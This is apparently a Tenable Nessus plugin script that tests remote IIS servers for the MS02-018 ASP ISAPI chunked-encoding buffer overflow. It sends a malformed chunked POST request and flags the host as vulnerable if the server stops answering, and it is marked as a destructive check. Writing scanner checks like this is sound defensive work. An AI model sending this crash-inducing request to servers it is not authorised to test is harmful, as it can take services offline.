#
# (C) Tenable Network Security, Inc.
#

# Thanks to: Marc Maiffret - his post on vuln-dev saved a lot of my time
#
# See the Nessus Scripts License for details
#


include("compat.inc");

if(description)
{
 script_id(10935);
 script_version ("$Revision: 1.40 $");
 script_cve_id("CVE-2002-0079", "CVE-2002-0147", "CVE-2002-0149");
 script_bugtraq_id(4478, 4485, 4490);
 script_osvdb_id(3301, 3320, 768);
 script_xref(name:"MSFT", value:"MS02-018");
 
 script_name(english:"Microsoft IIS ASP ISAPI Filter Multiple Overflows");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by multiple buffer overflow 
vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"There's a buffer overflow in the remote web server through
the ASP ISAPI filter.
 
It is possible to overflow the remote web server and execute 
commands as user 'SYSTEM'." );
 script_set_attribute(attribute:"see_also", value:"http://technet.microsoft.com/en-us/security/bulletin/ms02-018" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2002/May/32" );
 script_set_attribute(attribute:"solution", value:
"Apply the patches from Microsoft." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploit_framework_core", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/04/10");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/04/10");
 script_cvs_date("$Date: 2016/10/27 15:03:53 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:iis");
script_end_attributes();


 script_summary(english:"Tests for a remote buffer overflow in IIS");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"Web Servers");
 script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
 script_dependencie("find_service1.nasl", "http_version.nasl", "webmirror.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/ASP");
 exit(0);
}

# The attack starts here

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if ( ! can_host_asp(port:port) ) exit(0);

if ( http_is_dead(port:port) ) exit(0);

file = get_kb_item(string("www/", port, "/contents/extensions/asp/1"));
if(!file)file = "/iisstart.asp";
    

d = '10\r\n'
  + 'PADPADPADPADPADP\r\n'
  + '4\r\n' 
  + 'DATA\r\n'
  + '4\r\n'
  + 'DEST\r\n'
  + '0\r\n\r\n';

rq = http_mk_post_req(item: file, port: port,
   content_type: "application/x-www-form-urlencoded",
   add_headers: make_array("Transfer-Encoding", "chunked"),
   data: d);

req = http_mk_buffer_from_req(req: rq);

soc = open_sock_tcp(port);
if ( ! soc ) exit(0);
send(socket:soc, data:req);
r = recv_line(socket:soc, length:4095);
if ("HTTP/1.1 100 Continue" >!< r)
{
  close(soc);
  exit(0);
}

cnt = 0;
while(strlen(r) > 2 && cnt ++ < 1024){
	 r = recv_line(socket:soc, length:4096);
	 }
  
r = http_recv3(socket:soc);
if(!r) 
   {
   security_hole(port);
   close(soc);
   exit(0);
   }
else set_kb_item(name:"Q319733", value:TRUE);
